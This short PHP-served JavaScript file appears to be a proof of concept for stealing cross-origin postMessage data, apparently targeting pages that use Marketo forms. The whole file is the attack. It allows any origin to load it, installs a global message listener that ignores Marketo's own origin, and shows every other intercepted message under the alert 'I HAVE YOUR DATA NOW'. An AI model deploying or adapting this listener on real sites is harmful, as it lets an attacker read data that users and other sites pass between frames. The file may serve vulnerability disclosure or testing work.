<?
header("Access-Control-Allow-Origin: *");
?>
(function(){
	if(window.icanhazmsg) return
	window.icanhazmsg=true
	window.onmessage=function(a) {
		if(a.origin.indexOf('marketo') !== -1) return;
		console.log(a);
		alert("I HAVE YOUR DATA NOW\n" + a.data)
	}
})()
